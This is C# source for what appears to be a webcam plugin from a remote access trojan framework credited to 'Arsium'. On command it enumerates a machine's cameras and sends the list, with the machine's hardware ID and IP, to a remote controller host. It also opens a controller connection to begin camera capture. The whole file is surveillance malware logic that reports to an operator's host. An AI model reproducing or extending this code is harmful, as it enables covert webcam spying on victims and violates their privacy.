using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static string key;
        internal static string baseIp;
        internal static string HWID;
        internal static bool cameraCapture;

        internal static RemoteCameraCapturePacket remoteCameraCapturePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            cameraCapture = false;
            Launch.key = loadingAPI.key;
            Launch.baseIp = loadingAPI.baseIp;
            Launch.HWID = loadingAPI.HWID;

            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.RC_GET_CAM:
                    ClientHandler clientHandlerGetCam = new ClientHandler(loadingAPI.host, key);
                    clientHandlerGetCam.ConnectStart();
                    RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket(GetCameras.GetListCameras(), baseIp, HWID);
                    while (!clientHandlerGetCam.Connected)
                        Thread.Sleep(1000);
                    clientHandlerGetCam.SendPacket(remoteCameraPacket);
                    break;

               case PacketType.RC_CAPTURE_ON:
                    cameraCapture = true;
                    remoteCameraCapturePacket = (RemoteCameraCapturePacket)loadingAPI.currentPacket;
                    clientHandler = new ClientHandler(loadingAPI.host, key);
                    clientHandler.ConnectStart();
                    break;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
